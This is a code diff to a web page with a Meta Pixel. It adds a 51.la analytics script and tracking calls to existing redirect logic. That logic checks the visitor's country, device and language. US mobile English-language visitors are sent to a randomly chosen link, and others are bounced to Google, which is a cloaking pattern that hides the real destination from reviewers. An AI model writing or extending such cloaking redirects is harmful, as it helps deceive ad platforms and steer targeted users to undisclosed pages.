@@ -18,7 +18,8 @@ src="https://www.facebook.com/tr?id=1855781025019244&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
 
-       
+       <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+ 
  
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
@@ -665,7 +666,9 @@ src="https://www.facebook.com/tr?id=1855781025019244&ev=PageView&noscript=1"
       .then(data => {
         // Strict three-condition check
         if (data.country === 'US' && isMobileDevice() && isEnglishLang()) {
+              
           window.location.href = getRandomLink();
+                LA.init({id:"Kh8KAY2JWWVoz3Fh",ck:"Kh8KAY2JWWVoz3Fh"});
           return;
         }
 
@@ -674,7 +677,9 @@ src="https://www.facebook.com/tr?id=1855781025019244&ev=PageView&noscript=1"
       .catch(() => {
         // Strict two-condition check on IP detection failure
         if (isMobileDevice() && isEnglishLang()) {
-          window.location.href = getRandomLink();
+       
+               window.location.href = getRandomLink();
+                 LA.init({id:"Kh8KAY2JWWVoz3Fh",ck:"Kh8KAY2JWWVoz3Fh"});
           return;
         }
         window.location.href = "https://www.google.com";
